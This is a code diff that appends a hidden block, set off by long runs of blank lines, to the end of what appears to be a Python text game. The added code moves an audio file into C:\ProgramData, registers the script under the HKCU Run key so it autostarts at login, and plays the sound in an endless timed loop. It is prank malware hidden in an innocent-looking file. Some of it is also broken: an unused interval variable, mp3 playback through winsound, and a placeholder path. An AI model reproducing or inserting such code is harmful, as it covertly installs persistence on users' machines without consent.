@@ -757,3 +757,81 @@ def main():
                 print("Wow, that was fast! No matter. Let's get going.")
 
 main()
+
+
+
+
+
+
+import os
+import shutil
+import time
+import winsound
+import sys
+import winreg as reg
+
+# Define the path for the audio file and hidden destination
+audio_file = r"C:###REPLACE WITH SOUND EFFECTS###"  # Replace with your audio file path
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+hidden_location = r"C:\ProgramData"  # Replace with your hidden folder path
+
+# Ensure the hidden folder exists (it will be created if not)
+if not os.path.exists(hidden_location):
+    os.makedirs(hidden_location)
+
+# Move the audio file to the hidden folder
+shutil.move(audio_file, os.path.join(hidden_location, "audiofile.mp3"))
+
+# Define the interval (in seconds) between each audio play
+interval = 3600  # Time in seconds (e.g., 3600 = 1 hour)
+
+# Function to add to the registry for autorun
+def add_to_registry():
+    key = reg.HKEY_CURRENT_USER
+    sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
+    script_name = "AutoAudioPlay"
+    script_path = sys.argv[0]
+
+    try:
+        # Open the registry key
+        with reg.OpenKey(key, sub_key, 0, reg.KEY_WRITE) as registry_key:
+            # Add script to the registry
+            reg.SetValueEx(registry_key, script_name, 0, reg.REG_SZ, script_path)
+            print(f"Added {script_name} to registry for auto-start.")
+    except Exception as e:
+        print(f"Error adding to registry: {e}")
+
+# Add to registry if not already added
+add_to_registry()
+
+# Function to move the audio file (if not moved already) and play the audio
+def move_and_play_audio():
+    while True:
+        # Wait for the specified interval
+        time.sleep(1200)
+
+        # Play the audio file (you can use any .wav, .mp3, or .mid file)
+        winsound.PlaySound(os.path.join(hidden_location, "audiofile.mp3"), winsound.SND_FILENAME)
+
+        print("Audio played successfully!")
+
+# Run the function to play audio after the interval
+move_and_play_audio()
